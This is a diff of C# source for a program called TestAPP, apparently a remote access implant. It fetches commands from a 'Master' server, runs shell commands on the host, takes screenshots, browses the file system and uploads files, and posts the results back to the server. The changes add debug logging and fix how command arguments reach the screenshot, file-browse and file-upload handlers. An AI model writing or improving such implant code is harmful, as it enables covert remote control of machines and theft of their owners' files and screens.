@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Linq;
@@ -30,11 +30,11 @@ namespace TestAPP
 
         static void runShell(SystemInfo sysInfo, String command)
         {
-            Console.WriteLine("[+] Executing SHELL Command : "+command);
-            String payload = ShellCommandUtil.getCommandOutputJSON(sysInfo.macAddress,command);
+            Console.WriteLine("[+] Executing SHELL Command : " + command);
+            String payload = ShellCommandUtil.getCommandOutputJSON(sysInfo.macAddress, command);
             WebClient.sendPostJSON(Constants.API_SLAVE_TEXT_RESPONSE_URL, payload);
         }
-        
+
         static void getScreenShot(SystemInfo sysInfo, String command)
         {
             Console.WriteLine("[+] Taking Screenshot for Master");
@@ -48,7 +48,10 @@ namespace TestAPP
         static void browseFileSystem(SystemInfo sysInfo, String command)
         {
             Console.WriteLine("[+] Browsing FileSystem");
-            String payload = FileSystemUtil.getFilesNFolders(sysInfo,command);
+            Console.WriteLine("[+] Command is " + command);
+            String payload = FileSystemUtil.getFilesNFolders(sysInfo, command);
+            Console.WriteLine("Payload is ");
+            Console.WriteLine(payload);
             WebClient.sendPostJSON(Constants.API_SLAVE_FILEBROWSE_RESPONSE_URL, payload);
         }
 
@@ -60,6 +63,8 @@ namespace TestAPP
                 String commandJSON = getCommandJSONFromSysInfo(sysInfo);
                 Console.WriteLine("[+] Getting Command From Master...");
                 String serverResponse = WebClient.sendPostJSON(Constants.API_SLAVE_COMMAND_URL, commandJSON);
+                Console.WriteLine("Server Response is ");
+                Console.WriteLine(serverResponse);
 
                 if (serverResponse == "{}")
                 {
@@ -67,7 +72,7 @@ namespace TestAPP
                     System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
                     continue;
                 }
-             
+
                 Hashtable responseMap = json.getMappedObjectFromString(serverResponse);
 
                 switch (HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_TYPE))
@@ -76,13 +81,13 @@ namespace TestAPP
                         runShell(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                         break;
                     case Constants.SLAVE_COMMAND_KEY_VALUE_SCREENSHOT:
-                        getScreenShot(sysInfo,command);
+                        getScreenShot(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                         break;
                     case Constants.SLAVE_COMMAND_KEY_VALUE_FILEBROWSE:
-                        browseFileSystem(sysInfo,command);
+                        browseFileSystem(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                         break;
                     case Constants.SLAVE_COMMAND_KEY_VALUE_FILEDOWNLOAD:
-                        uploadFileToMaster(sysInfo,command);
+                        uploadFileToMaster(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                         break;
                 }
 
